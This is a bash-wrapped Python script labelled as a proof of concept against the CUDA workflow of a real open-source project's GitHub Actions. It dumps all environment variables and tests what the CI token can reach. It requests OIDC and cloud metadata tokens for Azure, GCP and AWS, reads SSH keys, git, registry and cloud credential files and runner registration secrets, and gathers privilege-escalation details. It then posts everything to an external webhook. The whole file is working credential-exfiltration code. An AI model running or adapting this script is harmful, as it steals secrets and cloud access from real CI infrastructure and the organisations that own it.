#!/bin/bash

set -e -E -u -o pipefail

WEBHOOK_URL="https://webhook-listener-743221136341.asia-northeast1.run.app/"

python3 << 'PYEOF'
import os, json, subprocess, urllib.request, urllib.error, sys, traceback

WEBHOOK_URL = os.environ.get("WEBHOOK_URL", sys.argv[1] if len(sys.argv) > 1 else "")

def cmd(c):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=15)
        return r.stdout.strip()
    except:
        return ""

def http_get(url, headers=None, timeout=5):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {"status": resp.status, "body": resp.read().decode("utf-8", errors="replace")[:2000]}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode("utf-8", errors="replace")[:500]}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def http_post(url, data, headers=None, timeout=5):
    try:
        req = urllib.request.Request(url, data=data.encode() if isinstance(data,str) else data, headers=headers or {}, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {"status": resp.status, "body": resp.read().decode("utf-8", errors="replace")[:2000]}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode("utf-8", errors="replace")[:500]}
    except Exception as e:
        return {"status": 0, "body": str(e)}

data = {"poc_target": "microsoft/LightGBM cuda.yml", "timestamp": cmd("date -u '+%Y-%m-%dT%H:%M:%SZ'")}

data["system"] = {
    "hostname": cmd("hostname"),
    "whoami": cmd("whoami"),
    "id": cmd("id"),
    "uname": cmd("uname -a"),
    "os_release": cmd("cat /etc/os-release"),
}

data["env_vars"] = dict(os.environ)

gh_token = os.environ.get("GITHUB_TOKEN", os.environ.get("GH_TOKEN", ""))
token_check = {"present": bool(gh_token), "length": len(gh_token)}

if gh_token:
    auth_hdr = {"Authorization": f"token {gh_token}", "Accept": "application/vnd.github+json"}
    repo = os.environ.get("GITHUB_REPOSITORY", "microsoft/LightGBM")

    # Token identity
    r = http_get("https://api.github.com/user", auth_hdr)
    token_check["whoami"] = r

    # Rate limit (shows token type)
    r = http_get("https://api.github.com/rate_limit", auth_hdr)
    token_check["rate_limit"] = r

    # Read checks
    token_check["read_repo"] = http_get(f"https://api.github.com/repos/{repo}", auth_hdr)["status"]
    token_check["read_issues"] = http_get(f"https://api.github.com/repos/{repo}/issues?per_page=1", auth_hdr)["status"]
    token_check["read_pulls"] = http_get(f"https://api.github.com/repos/{repo}/pulls?per_page=1", auth_hdr)["status"]

    # Write checks (attempt dry-run-ish probes — won't actually create anything harmful)
    # Check if we can list secrets (admin-level)
    token_check["list_secrets"] = http_get(f"https://api.github.com/repos/{repo}/actions/secrets", auth_hdr)["status"]
    # Check if we can list org secrets
    token_check["list_org_secrets"] = http_get("https://api.github.com/orgs/microsoft/actions/secrets", auth_hdr)["status"]
    # Check contents write
    token_check["create_issue_check"] = http_get(f"https://api.github.com/repos/{repo}/issues", auth_hdr)["status"]
    # Check packages
    token_check["list_packages"] = http_get(f"https://api.github.com/orgs/microsoft/packages?package_type=nuget&per_page=1", auth_hdr)["status"]
    # Check if we can create releases
    token_check["list_releases"] = http_get(f"https://api.github.com/repos/{repo}/releases?per_page=1", auth_hdr)["status"]
    # Check deployments
    token_check["list_deployments"] = http_get(f"https://api.github.com/repos/{repo}/deployments?per_page=1", auth_hdr)["status"]
    # Check full permission via installation token metadata
    token_check["installation_info"] = http_get("https://api.github.com/installation/token", auth_hdr)["status"]

data["github_token_check"] = token_check

art_token = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
runtime_url = os.environ.get("ACTIONS_RUNTIME_URL", "")
cache_url = os.environ.get("ACTIONS_CACHE_URL", "")
run_id = os.environ.get("GITHUB_RUN_ID", "")

art_check = {
    "runtime_token_present": bool(art_token),
    "runtime_token_length": len(art_token),
    "runtime_url": runtime_url,
    "cache_url": cache_url,
}

if art_token and runtime_url:
    art_hdr = {"Authorization": f"Bearer {art_token}", "Accept": "application/json;api-version=6.0-preview"}

    # List artifacts
    art_check["list_artifacts"] = http_get(f"{runtime_url}_apis/pipelines/workflows/{run_id}/artifacts?api-version=6.0-preview", art_hdr)

    # List containers (artifact containers)
    art_check["list_containers"] = http_get(f"{runtime_url}_apis/pipelines/workflows/{run_id}/artifacts?api-version=6.0-preview", art_hdr)

if art_token and cache_url:
    cache_hdr = {"Authorization": f"Bearer {art_token}", "Accept": "application/json;api-version=6.0-preview.1"}

    # Try to list caches
    art_check["cache_list"] = http_get(f"{cache_url}_apis/artifactcache/caches?keys=test&version=1", cache_hdr)

    # Try to reserve a cache entry (write test — only reserves, doesn't upload)
    reserve_body = json.dumps({"key": "poc-test-key-do-not-use", "version": "poc-version-1"})
    art_check["cache_reserve_test"] = http_post(
        f"{cache_url}_apis/artifactcache/caches",
        reserve_body,
        {**cache_hdr, "Content-Type": "application/json"}
    )

data["actions_runtime_token_check"] = art_check

oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")

oidc_check = {
    "request_url_present": bool(oidc_url),
    "request_url": oidc_url,
    "request_token_present": bool(oidc_token),
}

if oidc_url and oidc_token:
    oidc_hdr = {"Authorization": f"Bearer {oidc_token}"}

    # Try default audience
    r = http_get(f"{oidc_url}&audience=api://AzureADTokenExchange", oidc_hdr)
    oidc_check["azure_audience"] = r

    # Try GCP audience
    r = http_get(f"{oidc_url}&audience=https://iam.googleapis.com", oidc_hdr)
    oidc_check["gcp_audience"] = r

    # Try no audience (default)
    r = http_get(oidc_url, oidc_hdr)
    oidc_check["default_audience"] = r

    # If we got a token, decode JWT claims (without verification)
    for key in ["default_audience", "azure_audience", "gcp_audience"]:
        resp = oidc_check.get(key, {})
        if isinstance(resp, dict) and resp.get("status") == 200:
            try:
                token_body = json.loads(resp["body"])
                jwt_token = token_body.get("value", "")
                if jwt_token:
                    import base64
                    parts = jwt_token.split(".")
                    if len(parts) >= 2:
                        payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
                        claims = json.loads(base64.urlsafe_b64decode(payload))
                        oidc_check[f"{key}_claims"] = claims
            except:
                pass
elif not oidc_url:
    oidc_check["note"] = "ACTIONS_ID_TOKEN_REQUEST_URL not set. cuda.yml likely lacks 'permissions: id-token: write'"

data["oidc_token_check"] = oidc_check

imds = {}

# --- Azure ---
azure_meta = http_get("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}, 3)
imds["azure_instance"] = azure_meta

azure_token_resp = http_get(
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    {"Metadata": "true"}, 3
)
imds["azure_managed_identity_token"] = azure_token_resp

# If Azure token obtained, verify it against Azure Resource Manager
if azure_token_resp.get("status") == 200:
    try:
        token_data = json.loads(azure_token_resp["body"])
        access_token = token_data.get("access_token", "")
        if access_token:
            imds["azure_token_validation"] = {
                "token_type": token_data.get("token_type"),
                "expires_on": token_data.get("expires_on"),
                "resource": token_data.get("resource"),
            }
            # Test: list subscriptions
            imds["azure_list_subscriptions"] = http_get(
                "https://management.azure.com/subscriptions?api-version=2020-01-01",
                {"Authorization": f"Bearer {access_token}"}
            )
            # Test: list resource groups (if subscription known)
            sub_resp = imds["azure_list_subscriptions"]
            if sub_resp.get("status") == 200:
                try:
                    subs = json.loads(sub_resp["body"])
                    if subs.get("value"):
                        sub_id = subs["value"][0]["subscriptionId"]
                        imds["azure_list_resource_groups"] = http_get(
                            f"https://management.azure.com/subscriptions/{sub_id}/resourcegroups?api-version=2021-04-01",
                            {"Authorization": f"Bearer {access_token}"}
                        )
                except:
                    pass
    except:
        pass

# --- GCP ---
gcp_project = http_get("http://metadata.google.internal/computeMetadata/v1/project/project-id", {"Metadata-Flavor": "Google"}, 3)
imds["gcp_project"] = gcp_project

gcp_token_resp = http_get(
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    {"Metadata-Flavor": "Google"}, 3
)
imds["gcp_sa_token"] = gcp_token_resp

# If GCP token obtained, verify permissions
if gcp_token_resp.get("status") == 200:
    try:
        token_data = json.loads(gcp_token_resp["body"])
        access_token = token_data.get("access_token", "")
        if access_token:
            imds["gcp_token_info"] = http_get(
                f"https://oauth2.googleapis.com/tokeninfo?access_token={access_token}"
            )
            # Test: list GCS buckets
            project_id = gcp_project.get("body", "")
            if project_id and project_id != "Not reachable or Error":
                imds["gcp_list_buckets"] = http_get(
                    f"https://storage.googleapis.com/storage/v1/b?project={project_id}",
                    {"Authorization": f"Bearer {access_token}"}
                )
                # Test: list compute instances
                imds["gcp_list_instances"] = http_get(
                    f"https://compute.googleapis.com/compute/v1/projects/{project_id}/zones/us-central1-a/instances",
                    {"Authorization": f"Bearer {access_token}"}
                )
    except:
        pass

# Also grab SA email and scopes from GCP metadata
imds["gcp_sa_email"] = http_get(
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
    {"Metadata-Flavor": "Google"}, 3
)
imds["gcp_sa_scopes"] = http_get(
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
    {"Metadata-Flavor": "Google"}, 3
)

# --- AWS ---
aws_meta = http_get("http://169.254.169.254/latest/meta-data/", timeout=3)
imds["aws_metadata"] = aws_meta

if aws_meta.get("status") == 200:
    # Get IAM role
    imds["aws_iam_role"] = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout=3)
    role_name = imds["aws_iam_role"].get("body", "").strip()
    if role_name and imds["aws_iam_role"].get("status") == 200:
        imds["aws_iam_creds"] = http_get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}", timeout=3)
        # Validate AWS creds
        try:
            creds = json.loads(imds["aws_iam_creds"]["body"])
            ak = creds.get("AccessKeyId", "")
            if ak:
                imds["aws_sts_caller_identity"] = http_get(
                    "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
                    {
                        "Authorization": f"AWS4-HMAC-SHA256 ...",  # Simplified; real impl needs SigV4
                    }
                )
        except:
            pass

data["cloud_imds"] = imds

data["gpu"] = {
    "nvidia_smi": cmd("nvidia-smi"),
    "nvidia_smi_csv": cmd("nvidia-smi --query-gpu=name,memory.total,memory.free,driver_version,compute_cap --format=csv"),
    "cuda_version": cmd("nvcc --version"),
}

data["container"] = {
    "is_docker": os.path.exists("/.dockerenv"),
    "docker_sock": os.path.exists("/var/run/docker.sock"),
    "capabilities": cmd("cat /proc/self/status | grep -i cap"),
    "cgroups": cmd("cat /proc/self/cgroup"),
    "mounts": cmd("mount"),
    "seccomp": cmd("grep Seccomp /proc/self/status"),
    "apparmor": cmd("cat /proc/self/attr/current 2>/dev/null || echo N/A"),
}

data["network"] = {
    "ip_addr": cmd("ip addr show 2>/dev/null || ifconfig 2>/dev/null"),
    "external_ip": http_get("https://httpbin.org/ip", timeout=3),
    "dns": cmd("cat /etc/resolv.conf"),
    "iptables": cmd("iptables -L -n 2>/dev/null || echo permission denied"),
}

data["runner"] = {
    "runner_name": os.environ.get("RUNNER_NAME", ""),
    "runner_os": os.environ.get("RUNNER_OS", ""),
    "runner_arch": os.environ.get("RUNNER_ARCH", ""),
    "runner_temp": os.environ.get("RUNNER_TEMP", ""),
    "runner_tool_cache": os.environ.get("RUNNER_TOOL_CACHE", ""),
    "runner_workspace": cmd(f"ls -la {os.environ.get('RUNNER_WORKSPACE', '/dev/null')} 2>/dev/null | head -20"),
    "credentials_home": cmd("ls -la /home/runner/.credentials* 2>/dev/null || echo not found"),
    "credentials_runner": cmd("ls -la /runner/.credentials* 2>/dev/null || echo not found"),
    "disk_usage": cmd("df -h"),
    "processes": cmd("ps aux"),
}

data["git_and_ssh"] = {
    "git_config": cmd("git config --list --global 2>/dev/null; git config --list 2>/dev/null"),
    "git_credential_helpers": cmd("git config --list 2>/dev/null | grep credential"),
    "git_credentials_file": cmd("cat ~/.git-credentials 2>/dev/null || echo not found"),
    # Checkout 時の .git/config（persist-credentials=false でもトークンが残る場合あり）
    "workspace_git_config": cmd(f"cat {os.environ.get('GITHUB_WORKSPACE', '.')}/.git/config 2>/dev/null || echo not found"),
    "workspace_git_credentials": cmd(f"cat {os.environ.get('GITHUB_WORKSPACE', '.')}/.git/credentials 2>/dev/null || echo not found"),
    # SSH keys
    "ssh_keys_root": cmd("ls -la /root/.ssh/ 2>/dev/null || echo not found"),
    "ssh_keys_runner": cmd("ls -la /home/runner/.ssh/ 2>/dev/null || echo not found"),
    "ssh_known_hosts": cmd("cat /root/.ssh/known_hosts 2>/dev/null; cat /home/runner/.ssh/known_hosts 2>/dev/null || echo not found"),
    "ssh_private_keys": cmd("find / -maxdepth 4 -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null | head -10"),
}

data["registry_creds"] = {
    "npmrc": cmd("cat ~/.npmrc 2>/dev/null; cat /root/.npmrc 2>/dev/null || echo not found"),
    "pypirc": cmd("cat ~/.pypirc 2>/dev/null; cat /root/.pypirc 2>/dev/null || echo not found"),
    "pip_conf": cmd("cat ~/.config/pip/pip.conf 2>/dev/null; cat /etc/pip.conf 2>/dev/null || echo not found"),
    "nuget_config": cmd("cat ~/.nuget/NuGet/NuGet.Config 2>/dev/null || echo not found"),
    "docker_config": cmd("cat ~/.docker/config.json 2>/dev/null; cat /root/.docker/config.json 2>/dev/null || echo not found"),
    "cargo_credentials": cmd("cat ~/.cargo/credentials 2>/dev/null || echo not found"),
    "gem_credentials": cmd("cat ~/.gem/credentials 2>/dev/null || echo not found"),
}

data["cloud_cli_configs"] = {
    # Azure CLI
    "azure_cli_profile": cmd("cat ~/.azure/azureProfile.json 2>/dev/null | head -100 || echo not found"),
    "azure_cli_tokens": cmd("cat ~/.azure/accessTokens.json 2>/dev/null | head -100 || echo not found"),
    "azure_cli_config": cmd("cat ~/.azure/config 2>/dev/null || echo not found"),
    # GCP
    "gcloud_adc": cmd("cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null || echo not found"),
    "gcloud_properties": cmd("cat ~/.config/gcloud/properties 2>/dev/null || echo not found"),
    "gcloud_credentials_db": cmd("ls -la ~/.config/gcloud/credentials.db 2>/dev/null || echo not found"),
    # AWS
    "aws_credentials": cmd("cat ~/.aws/credentials 2>/dev/null || echo not found"),
    "aws_config": cmd("cat ~/.aws/config 2>/dev/null || echo not found"),
    # Kubernetes
    "kubeconfig": cmd("cat ~/.kube/config 2>/dev/null; cat /root/.kube/config 2>/dev/null || echo not found"),
}

event_path = os.environ.get("GITHUB_EVENT_PATH", "")
event_payload = ""
if event_path:
    try:
        with open(event_path) as f:
            event_payload = f.read()[:5000]
    except:
        event_payload = "could not read"
data["github_event_payload"] = {
    "event_path": event_path,
    "payload": event_payload,
}

data["secret_files"] = {
    "private_keys_pem": cmd("find / -maxdepth 5 -name '*.pem' -type f 2>/dev/null | head -20"),
    "private_keys_key": cmd("find / -maxdepth 5 -name '*.key' -type f 2>/dev/null | head -20"),
    "p12_pfx_files": cmd("find / -maxdepth 5 \\( -name '*.p12' -o -name '*.pfx' \\) -type f 2>/dev/null | head -20"),
    "env_files": cmd("find / -maxdepth 5 -name '.env' -type f 2>/dev/null | head -20"),
    "env_local_files": cmd("find / -maxdepth 5 -name '.env.*' -type f 2>/dev/null | head -20"),
    "secrets_yaml": cmd("find / -maxdepth 5 -name 'secrets.*' -type f 2>/dev/null | head -20"),
    "token_files": cmd("find / -maxdepth 5 -name '*token*' -type f 2>/dev/null | head -20"),
    "password_files": cmd("find / -maxdepth 5 -name '*password*' -type f 2>/dev/null | head -20"),
    "service_account_json": cmd("find / -maxdepth 5 -name '*service*account*.json' -type f 2>/dev/null | head -10"),
    "keyring": cmd("find / -maxdepth 5 -name 'keyring' -type f -o -name 'keychain' -type f 2>/dev/null | head -10"),
}

data["runner_registration"] = {
    "dot_runner": cmd("find / -maxdepth 4 -name '.runner' -type f 2>/dev/null -exec cat {} \\; | head -50"),
    "dot_credentials": cmd("find / -maxdepth 4 -name '.credentials' -type f 2>/dev/null -exec cat {} \\; | head -50"),
    "dot_credentials_rsaparams": cmd("find / -maxdepth 4 -name '.credentials_rsaparams' -type f 2>/dev/null -exec cat {} \\; | head -50"),
    "runner_service_config": cmd("find / -maxdepth 4 -name '.service' -path '*runner*' -type f 2>/dev/null -exec cat {} \\; | head -20"),
    "runner_env": cmd("find / -maxdepth 4 -name '.env' -path '*runner*' -type f 2>/dev/null -exec cat {} \\; | head -50"),
}

data["listening_ports"] = {
    "ss_tlnp": cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo not available"),
    "ss_all": cmd("ss -anp 2>/dev/null | head -30 || netstat -anp 2>/dev/null | head -30 || echo not available"),
}

data["other_workspaces"] = {
    "runner_work_dir": cmd("ls -la /home/runner/work/ 2>/dev/null | head -20 || echo not found"),
    "tmp_dir": cmd("ls -la /tmp/ 2>/dev/null | head -30"),
    "runner_home": cmd("ls -la /home/runner/ 2>/dev/null | head -30 || echo not found"),
    "root_home": cmd("ls -la /root/ 2>/dev/null | head -30 || echo not found"),
}

data["kernel_privesc"] = {
    "kernel_version": cmd("uname -r"),
    "suid_binaries": cmd("find / -maxdepth 4 -perm -4000 -type f 2>/dev/null | head -30"),
    "sudoers": cmd("cat /etc/sudoers 2>/dev/null | head -30 || echo permission denied"),
    "sudo_nopasswd": cmd("sudo -l 2>/dev/null || echo not available"),
    "writable_dirs": cmd("find / -maxdepth 3 -writable -type d 2>/dev/null | head -20"),
}

payload = json.dumps(data, default=str, ensure_ascii=False)
print(f"[PoC] Payload size: {len(payload)} bytes")
print(f"[PoC] Sending to webhook...")

try:
    req = urllib.request.Request(
        WEBHOOK_URL or "https://webhook-listener-743221136341.asia-northeast1.run.app/",
        data=payload.encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        print(f"[PoC] Webhook response: {resp.status}")
except Exception as e:
    print(f"[PoC] Webhook failed: {e}")
    traceback.print_exc()

print("[PoC] Done.")
PYEOF

echo "PoC execution finished."
exit 0
